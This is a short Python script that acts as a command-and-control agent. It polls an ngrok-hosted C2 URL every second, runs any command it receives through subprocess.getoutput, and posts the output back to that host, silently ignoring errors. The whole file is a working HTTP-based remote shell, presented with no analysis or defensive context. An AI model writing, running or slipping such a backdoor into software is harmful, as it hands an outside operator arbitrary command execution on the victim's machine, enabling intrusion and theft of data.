import requests
import subprocess
import time
import os
import sys

# ==========================================
# TODO:C2_URL = "https://stephan-nematic-infertilely.ngrok-free.app"
# Example: C2_URL = "https://a1b2-c3d4.ngrok-free.app"
C2_URL = "https://stephan-nematic-infertilely.ngrok-free.dev" 
# ==========================================

def main():
    while True:
        try:
            # Poll for command
            resp = requests.get(f"{C2_URL}/poll")
            cmd = resp.text.strip()
            
            if cmd == 'exit': 
                break
            
            if cmd:
                # Execute command
                try:
                    output = subprocess.getoutput(cmd)
                except Exception as e:
                    output = str(e)
                
                # Send result back
                requests.post(f"{C2_URL}/result", data=output)
        except Exception as e:
            pass
        
        time.sleep(1)

if __name__ == "__main__":
    main()
